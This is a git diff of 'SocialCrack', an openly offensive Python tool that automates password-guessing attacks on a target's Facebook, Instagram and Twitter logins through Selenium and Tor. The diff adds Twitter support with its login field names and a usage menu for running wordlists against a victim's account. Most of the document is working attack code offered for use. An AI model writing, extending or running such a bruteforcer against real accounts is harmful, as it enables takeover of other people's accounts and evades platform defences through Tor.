@@ -1,7 +1,7 @@
 """
-Facebook And Instagram Bruteforcer
-@Author crypt0sploit
-@Date 1 Mar 2019
+Social-Media Bruteforcer
+@AUTHOR crypt0sploit
+@DATE 1 Mar 2019
 """
 
 from selenium import webdriver
@@ -11,17 +11,15 @@ import sys
 import time
 import pyautogui
 
-script, service, password1 = sys.argv
-
-class brute_bot:
+class brute_bot(object):
 
     def __init__(self, email, password, site, email_field, pass_field):
         self.email = email
         self.password = password
         self.site = site
         self.email_field = email_field
-        self.pass_field = pass_field
-        self.driver = TorBrowserDriver('/root/tor-browser_en-US/') # Specify the location of TOR Browser
+        self.pass_field = pass_field     
+        self.driver = TorBrowserDriver('/root/tor-browser_en-US/')
 
     def Close_Browser(self):
         self.driver.close()
@@ -60,14 +58,14 @@ banner = """\n\t
   ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   < 
  |_____/ \___/ \___|_|\__,_|_|\_____|_|  \__,_|\___|_|\_\\
                                                          
-            AUTHOR -- crypt0sploit ( Adrian )
-            INSTAGRAM -- __adyadrian_aa
+            AUTHOR --> crypt0sploit ( Adrian )
+            INSTAGRAM --> _adyadrian_aa
 
 """
 
 def main_menu():
 
-    if service == "facebook":
+    if sys.argv[1] == "facebook":
         site = "https://www.facebook.com"
         print(banner)
         print("Waking up BOT...")
@@ -75,39 +73,54 @@ def main_menu():
         pfield = 'pass'
         time.sleep(2)
         email1 = str(input("\nThe Email Address/ Phone NUMBER of the target >> "))
-        target = open(password1, 'r')
+        target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
         execute.bruteforcer()
-    
-    elif service == "instagram":
-        site = "https://www.instagram.com/accounts/login/?source=auth_switcher"
+
+    elif sys.argv[1] == "instagram":
+        site = "https://www.instagram.com/accounts/login/"
         print(banner)
         print("Waking up BOT...")
         efield = 'username'
         pfield = 'password'
         time.sleep(2)
         email1 = str(input("\nThe Username of the Target >> "))
-        target = open(password1)
+        target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
         execute.bruteforcer()
-
-    #elif service == "steam":
-    #    site = "https://store.steampowered.com/login/?redir=&redir_ssl=1"
-    #    print("Waking up BOT...")
-    #    efield = 'username'
-    #    pfield = 'password'
-    #    time.sleep(2)
-    #    email1 = str(input("\nThe Username of the Target >> "))
-    #    target = open(password1)
-    #    readpass = target.readlines()
-    #   execute = brute_bot(email1, readpass, site, efield, pfield)
-    #   execute.bruteforcer()
+    
+    elif sys.argv[1] == "twitter":
+        site = "https://twitter.com/login/"
+        print(banner)
+        print("Waking up BOT...")
+        efield = 'session[username_or_email]'
+        pfield = 'session[password]'
+        time.sleep(2)
+        email1 = str(input("\nThe Username/Email of the Target >> "))
+        target = open(sys.argv[2])
+        readpass = target.readlines()
+        execute = brute_bot(email1, readpass, site, efield, pfield)
+        execute.bruteforcer()
 
     else:
         print("Wrong argv !!")
         exit(0)
 
 if __name__ == "__main__":
-    main_menu()
+    try:
+        main_menu()
+    except IndexError:
+        print(f"""
+        {banner}
+        \n===============================================================================
+        \nWelcome to the SocialCrack help menu:
+        Usage:
+            Facebook:     python3 SocialCrack.py facebook /path/to/your/wordlist.txt
+
+            Instagram:    python3 SocialCrack.py instagram /path/to/your/wordlist.txt
+              
+            Twitter:      python3 SocialCrack.py twitter /path/to/your/wordlist.txt
+        \n===============================================================================
+        """)
